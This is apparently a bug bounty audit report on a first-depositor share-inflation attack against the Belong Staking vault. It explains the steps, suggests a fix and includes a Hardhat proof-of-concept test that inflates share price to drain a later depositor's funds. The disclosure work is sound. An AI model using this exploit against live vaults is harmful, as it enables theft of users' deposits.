# 57736 sc critical first depositor attack is possible

**Submitted on Oct 28th 2025 at 15:00:16 UTC by @doichantran for** [**Audit Comp | Belong**](https://immunefi.com/audit-competition/audit-comp-belong)

* **Report ID:** #57736
* **Report Type:** Smart Contract
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-belong/blob/main/contracts/v2/periphery/Staking.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief / Intro

The `Staking` contract is vulnerable to a first-deposit attack where an attacker can manipulate the share distribution mechanism to mint disproportionately large shares, effectively stealing user deposits.

### Vulnerability Details

The attack follows this flow:

{% stepper %}
{% step %}

### First actor deposits

A legitimate user is the first to interact with the vault and sends a deposit transaction.
{% endstep %}

{% step %}

### Attacker frontruns with two actions

The attacker frontruns the user's transaction and:

* deposits 1 wei asset into the vault (minting 1 wei share), and
* donates a large amount of asset directly to the vault (increasing total assets).
  {% endstep %}

{% step %}

### User mints zero shares

The user's transaction executes afterwards and mints 0 shares due to rounding in the ERC4626 formula:

shares = assets \* sharesSupply / totalAssets

Since sharesSupply is 1 (attacker's 1 wei share) and totalAssets is large (attacker's donation), rounding causes the user to receive 0 shares.
{% endstep %}

{% step %}

### Attacker withdraws funds

The attacker withdraws the donated assets plus the user's deposit.
{% endstep %}
{% endstepper %}

Note: Belong's Staking contract uses Solady's ERC4626 implementation which adds an extra +1 in the calculations of shares and assets, making the attack less profitable and harder to perform. However, the attack remains feasible when there are 2 or more near-simultaneous first deposits in the mempool. Given Staking.sol is a core mechanic with many deposit chances, this is a realistic risk.

### Suggested fix

{% hint style="info" %}
Mint a certain amount of shares to address(0) during vault deployment or require the first depositor to mint a minimal number of shares. This avoids the zero-share edge case for initial depositors.
{% endhint %}

## Impact Details

An attacker can effectively steal a staker's deposit by causing the staker to mint zero shares even though they deposited the Long token. The attack is more likely when multiple near-equal first deposits exist in the mempool, and because Staking.sol is a core mechanic, many opportunities for the attack exist.

## References

<https://github.com/immunefi-team/audit-comp-belong/blob/a17f775dcc4c125704ce85d4e18b744daece65af/contracts/v2/periphery/Staking.sol#L240-L251>

## Proof of Concept

Put this into test/v2/platform/staking.test.ts

```typescript
describe('1st Deposit Attack', () => {
  it('1stDepositAttack()', async () => {
    const { staking, long, admin, minter, user1, user2 } = await loadFixture(fixture);

    /*   ---------------   USER1 DEPOSIT AND DONATE   ---------------    */
    const user1DepositAmount = 1;
    const donationAmount = ethers.utils.parseEther('1000');
    const user1LongBalanceBefore = ethers.utils.parseEther('1001');

    // user1 get Long Token
    await long.connect(admin).transfer(user1.address, user1LongBalanceBefore);

    // user1 deposit Long Token
    await long.connect(user1).approve(staking.address, user1DepositAmount);
    const tx1 = await staking.connect(user1).deposit(user1DepositAmount, user1.address);

    // user1 donate Long Token
    await long.connect(user1).transfer(staking.address, donationAmount);

    const user1Shares = await staking.balanceOf(user1.address);
    const vaultBalance = await long.balanceOf(staking.address);

    console.log("");
    console.log("-----   USER1 DEPOSIT AND DONATE   -----");
    console.log("user1 shares:      ", user1Shares);
    console.log("vaultBalance:      ", vaultBalance);

    /*   ---------------   USER2 DEPOSIT   ---------------    */
    const user2LongAmount = ethers.utils.parseEther('10000');

    const user2DepositAmount = ethers.utils.parseEther('500');
    const user2DepositAmount2 = ethers.utils.parseEther('600');
    const user2DepositAmount3 = ethers.utils.parseEther('700');
    const user2DepositAmount4 = ethers.utils.parseEther('800');

    // user2 get Long Token
    await long.connect(admin).transfer(user2.address, user2LongAmount);

    // user2 deposit Long Token multiple times
    await long.connect(user2).approve(staking.address, user2LongAmount);
    const tx2 = await staking.connect(user2).deposit(user2DepositAmount, user2.address);
    const tx3 = await staking.connect(user2).deposit(user2DepositAmount2, user2.address);
    const tx4 = await staking.connect(user2).deposit(user2DepositAmount3, user2.address);
    const tx5 = await staking.connect(user2).deposit(user2DepositAmount4, user2.address);

    const user2Shares = await staking.balanceOf(user2.address);
    const vaultTotalSupply = await staking.totalSupply();
    const vaultBalanceAfter = await long.balanceOf(staking.address);

    console.log("");
    console.log("-----   USER2 DEPOSIT   -----");
    console.log("user2 shares:      ", user2Shares);
    console.log("vaultTotalSupply:  ", vaultTotalSupply);
    console.log("vaultBalanceAfter: ", vaultBalanceAfter);

    /*   ---------------   USER1 WITHDRAW   ---------------    */
    await staking.connect(admin).setMinStakePeriod(1);

    const tx = await staking.connect(user1).redeem(user1Shares, user1.address, user1.address);

    const user1LongBalanceAfter = await long.balanceOf(user1.address);

    console.log("");
    console.log("-----   USER1 WITHDRAW   -----");
    console.log("user1 Long Before: ", user1LongBalanceBefore);
    console.log("user1 Long After:  ", user1LongBalanceAfter);
  });
});
```
